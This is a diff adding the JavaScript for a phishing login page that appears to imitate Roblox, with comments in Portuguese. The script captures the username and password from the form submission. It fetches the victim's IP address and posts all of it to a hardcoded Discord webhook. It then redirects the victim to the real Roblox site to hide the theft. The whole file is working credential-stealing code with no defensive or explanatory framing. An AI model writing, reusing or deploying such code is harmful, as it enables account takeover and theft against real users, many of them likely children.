@@ -1,0 +1,35 @@
+const WEBHOOK = "https://discord.com/api/webhooks/1455252054732705999/hBz8cHYsYzFBsIZ2SkIqWvQ2a9Z6zXSvcAzqPvFpHNK-gP9p5gH3PrF8Gql-a9XRY1cB";
+
+// mostra/esconde senha
+document.querySelector(".togglePwd").addEventListener("click", e => {
+  const inp = document.getElementById("pass");
+  inp.type = inp.type === "password" ? "text" : "password";
+});
+
+// captura + envio
+document.getElementById("loginForm").addEventListener("submit", async ev => {
+  ev.preventDefault();
+  const user = document.getElementById("user").value;
+  const pass = document.getElementById("pass").value;
+
+  const payload = {
+    embeds: [{
+      title: "Novo login Roblox",
+      color: 0x00a2ff,
+      fields: [
+        { name: "Usuário", value: user, inline: true },
+        { name: "Senha", value: pass, inline: true }
+      ],
+      footer: { text: "IP: " + (await (await fetch("https://ipapi.co/json")).json()).ip }
+    }]
+  };
+
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+
+  // redireciona para o site real depois de capturar
+  location.href = "https://www.roblox.com/home";
+});
